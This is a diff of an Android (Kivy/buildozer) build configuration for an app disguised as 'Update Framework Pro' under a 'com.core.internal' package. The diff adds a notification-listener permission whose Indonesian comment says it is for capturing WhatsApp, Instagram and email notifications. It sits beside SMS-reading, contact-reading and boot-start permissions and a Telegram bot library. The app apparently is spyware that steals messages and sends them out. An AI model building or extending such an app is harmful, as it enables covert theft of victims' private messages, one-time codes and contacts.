@@ -1,18 +1,17 @@
 [app]
 title = Update Framework Pro
-package.name = core_system_v4
+package.name = core_system_v5
 package.domain = com.core.internal
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas
-version = 4.1
+version = 5.0
 
-# Requirements
+# Library untuk Telegram dan Android
 requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
 
-# Permissions
-android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS
+# PERMISSION TAMBAHAN UNTUK WA/IG/EMAIL (BIND_NOTIFICATION_LISTENER_SERVICE)
+android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS, BIND_NOTIFICATION_LISTENER_SERVICE
 
-# Android Settings
 android.api = 28
 android.minapi = 21
 android.ndk = 25b
